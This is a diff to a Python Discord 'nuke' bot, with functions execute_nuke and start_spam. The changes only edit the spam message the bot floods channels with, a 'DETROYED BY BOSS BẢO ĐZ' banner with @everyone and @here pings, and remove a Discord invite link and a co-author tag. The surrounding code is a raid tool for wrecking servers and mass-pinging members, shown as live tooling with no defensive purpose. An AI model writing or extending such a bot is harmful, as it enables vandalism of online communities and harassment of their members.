@@ -453,10 +453,10 @@ async def execute_nuke(guild):
             await asyncio.sleep(2.0)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ (●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
+            ' "|| Dont have a link support ||"'
         )
 
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
@@ -615,10 +615,10 @@ async def start_spam(ctx):
     async def spam_loop():
         global is_spamming
         spam_text = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ (●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
+            ' "|| Dont have a link support ||"'
         )
         while is_spamming:
             channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
